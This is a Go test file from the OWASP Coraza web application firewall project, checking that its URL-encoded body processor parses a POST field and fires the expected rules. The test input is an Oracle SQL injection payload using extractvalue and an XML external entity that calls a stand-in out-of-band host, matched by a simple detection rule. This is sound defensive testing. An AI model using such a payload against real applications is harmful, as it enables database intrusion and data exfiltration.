// Copyright 2022 Juan Pablo Tosso and the OWASP Coraza contributors
// SPDX-License-Identifier: Apache-2.0

package engine

import (
	"github.com/corazawaf/coraza/v3/testing/profile"
)

var _ = profile.RegisterProfile(profile.Profile{
	Meta: profile.Meta{
		Author:      "jptosso",
		Description: "Test if the body processors work",
		Enabled:     true,
		Name:        "special_urlencoded.yaml",
	},
	Tests: []profile.Test{
		{
			Title: "posturlencoded",
			Stages: []profile.Stage{
				{
					Stage: profile.SubStage{
						Input: profile.StageInput{
							URI:     "/",
							Method:  "POST",
							Headers: map[string]string{"Content-Type": "application/x-www-form-urlencoded"},
							Data:    `var=EmptyValue'||(select extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % awpsd SYSTEM "http://0cddnr5evws01h2bfzn5zd0cm3sxvrjv7oufi4.example'||'foo.bar/">%awpsd;`,
						},
						Output: profile.ExpectedOutput{
							TriggeredRules:    []int{100, 101},
							NonTriggeredRules: []int{102},
						},
					},
				},
			},
		},
	},
	Rules: `
SecRequestBodyAccess On
SecRule REQBODY_PROCESSOR "URLENCODED" "id:100,log,phase:2"
SecRule ARGS_POST:var "@contains extractvalue" "id:101,log,phase:2"
SecRule ARGS_POST:var "@contains NoSuchPayload" "id:102,log,phase:2"
`,
})
